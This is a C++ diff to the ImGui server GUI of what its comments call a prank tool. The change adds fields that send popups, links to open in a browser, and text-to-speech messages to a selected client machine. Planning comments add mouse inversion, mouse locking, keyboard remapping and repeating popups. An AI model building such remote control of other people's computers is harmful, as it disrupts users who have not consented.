@@ -1,4 +1,5 @@
 #include "ip.h"
+#include "../../packet.h"
 #include <GLFW/glfw3.h>
 #include "imgui.h"
 #include "imgui_impl_glfw.h"
@@ -13,25 +14,7 @@
 #include <memory>
 
 using asio::ip::tcp;
-using asio::ip::udp;
 
-enum packet_id {
-    GET_DATA = 0,
-    POPUP = 1
-};
-
-#pragma pack(push, 1)
-struct Packet {
-    packet_id id;
-    union {
-        int number;
-        packet_id packetid;
-        double double_number;
-        char str[256];
-    };
-    
-};
-#pragma pack(pop)
 
 class Client {
 private:
@@ -70,6 +53,8 @@ private:
     std::map<int, std::unique_ptr<Client>> clients_;
 
 public:
+    int selected_client = -1;
+
     Server(const std::string& address, unsigned short port)
         : acceptor_(io_context_, tcp::endpoint(asio::ip::make_address(address), port)),
           current_id_(0) {}
@@ -155,6 +140,42 @@ public:
     }
 };
 
+class Send_Field {
+    private:
+        char text_buffer[256] = "";
+        Server& server;
+        int selected_client;
+        std::string lable;
+        packet_id packetId;
+    public:
+    Send_Field(std::string lable_, packet_id packetId_, Server& server_) : server(server_), lable(lable_), packetId(packetId_) {}
+
+    void draw() {
+        selected_client = server.selected_client;
+    
+        ImGui::Text(lable.c_str());
+        ImGui::SameLine();
+    
+        std::string input_id = "##input_" + lable;
+        bool enter_pressed = ImGui::InputText(input_id.c_str(), text_buffer, sizeof(text_buffer), ImGuiInputTextFlags_EnterReturnsTrue);
+    
+        ImGui::SameLine();
+        std::string button_id = "Send##" + lable;
+        if (ImGui::Button(button_id.c_str()) || enter_pressed) {
+            if (server.is_client_connected(selected_client)) {
+                Packet packet{packetId};
+                std::strcpy(packet.str, text_buffer);
+                server.send_to_client(selected_client, packet);
+                std::strcpy(text_buffer, "");
+            } else if (selected_client == -1) {
+                std::cout << "Please select a client";
+            } else {
+                std::cout << "Client no longer connected\n";
+            }
+        }
+    }
+};
+
 
 int main() {
 
@@ -171,7 +192,6 @@ int main() {
     static ImVec4 background_color = ImVec4(0.102f, 0.102f, 0.102f, 1.0f);
 
     Server server{ip, 1234};
-    char text_buffer[256] = "";
 
 
     std::thread accept_thread([&server]() {
@@ -182,9 +202,11 @@ int main() {
         server.check_if_client_alive();
     });
     alive_thread.detach();
+    
+    Send_Field popup{"Popup", packet_id::POPUP, server};
+    Send_Field open_link{"Open link", packet_id::OPEN_LINK, server};
+    Send_Field tts{"Send tts", packet_id::TTS, server};
 
-
-    int selected_client = -1;
     while (!glfwWindowShouldClose(w)) {
    //     std::cout << "main loop start\n"; 
         glfwPollEvents();
@@ -197,40 +219,21 @@ int main() {
 
         ImGui::Begin("Send Data");
         /*
-            - open an image from a link
+            d open an image from a link
                 - or maybe send the image to be downloaded and then shown
-            - send a pop up with a message of my choosing
+            d send a pop up with a message of my choosing
                 - group mode (a few pop ups)
                 - life bar (how many times you have to close the popup before it does not come back)
                 - infinite life mode
                 - create popup that avoids the mouse
 
-            - send link which gets opened in a browseien
-            - make it so keyboard presses become a random key (t)
-            - send tts message
+            d send link which gets opened in a browseien
+            d send tts message
         */
         //std::cout << "before popup\n";
-            ImGui::Text("Popup");
-            ImGui::SameLine();
-            ImGui::InputText("",text_buffer, sizeof(text_buffer), ImGuiInputTextFlags_EnterReturnsTrue);
-            ImGui::SameLine();
-
-            bool enter_pressed = ImGui::IsItemDeactivatedAfterEdit() && ImGui::IsKeyPressed(ImGuiKey_Enter);
-
-            if(ImGui::Button("Send") || enter_pressed) {
-                if(server.is_client_connected(selected_client)) {
-                    Packet packet{POPUP};
-                    std::strcpy(packet.str, text_buffer);
-                    server.send_to_client(selected_client, packet);
-                    std::strcpy(text_buffer, "");
-                } else if(selected_client == -1) {
-                    std::cout << "Please select a client";
-                }
-                else {
-                    std::cout << "client no longer connected\n";
-                }
-            }
-        // std::cout << "after popup\n";
+            popup.draw();
+            open_link.draw();
+            tts.draw();
         ImGui::End();
 
         ImGui::Begin("Mouse");
@@ -239,12 +242,14 @@ int main() {
             - inverted mouse (t)
             - lock mouse to a small box
         */
+
         ImGui::End();
 
         ImGui::Begin("Keyboard");
         /*
             - send message to be typed by the user's keyboard
             - echo keyboard (repeats what was typed after a few seconds)
+            - make it so keyboard presses become a random key (t)
         */
         ImGui::End();
 
@@ -266,26 +271,24 @@ int main() {
             - A log of pranks ran
             - Add a prank schedual
         */
-            //std::cout << "before get connected clients start\n"; 
             std::vector<int> clients = server.get_connected_clients();
 
                 for(auto id : clients) {
                     std::string lable = "Client: " + std::to_string(id);
 
-                    if(selected_client == id) {
+                    if(server.selected_client == id) {
                         ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.2f, 0.6f, 0.9f, 1.0f));
                     }
 
                     if(ImGui::Button(lable.c_str())) {
                         std::cout << "selected client: " << id << "\n";
-                        selected_client = id;
+                        server.selected_client = id;
                     }
 
-                    if(selected_client == id) {
+                    if(server.selected_client == id) {
                         ImGui::PopStyleColor(1); 
                     }
                 }
-            //std::cout << "end of loop\n"; 
         ImGui::End();
 
         ImGui::Begin("customize");
